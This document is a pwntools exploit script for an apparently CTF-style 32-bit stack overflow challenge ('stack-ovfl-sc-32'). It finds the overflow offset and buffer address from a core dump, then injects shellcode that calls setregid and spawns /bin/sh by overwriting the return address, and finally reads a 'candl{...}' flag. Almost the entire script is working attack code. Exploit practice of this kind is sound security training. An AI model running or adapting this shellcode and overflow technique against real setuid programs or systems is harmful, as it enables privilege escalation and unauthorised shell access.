from pwn import *
import os

DEBUG = False 

# crash the process to get a core file and find the buffer address (still boilerplate)

io = process('./stack-ovfl-sc-32', env={}, setuid=False)
io.sendline(cyclic(10000)) 
io.wait()
core = io.corefile
buffer_address = core.stack.find(cyclic(50))
max_len = cyclic(10000).find(p32(core.fault_addr))
os.unlink(core.path) 

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug('./stack-ovfl-sc-32', env={}, gdbscript='''
b *input_func+110
continue
''')

else:
    io = process('./stack-ovfl-sc-32', env={})


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

shellcode = asm('''
mov    eax,0x32
int    0x80
mov    ebx,eax
mov    ecx,eax
mov    eax,0x47
int    0x80
mov    ecx,0x0
mov    edx,0x0
mov    eax,0xb
push   0x0
push   0x68732f6e
push   0x69622f2f
mov    ebx,esp
int    0x80
''') 

payload = shellcode + b"A" * (max_len - len(shellcode)) + p32(buffer_address)
io.send(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Hello', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
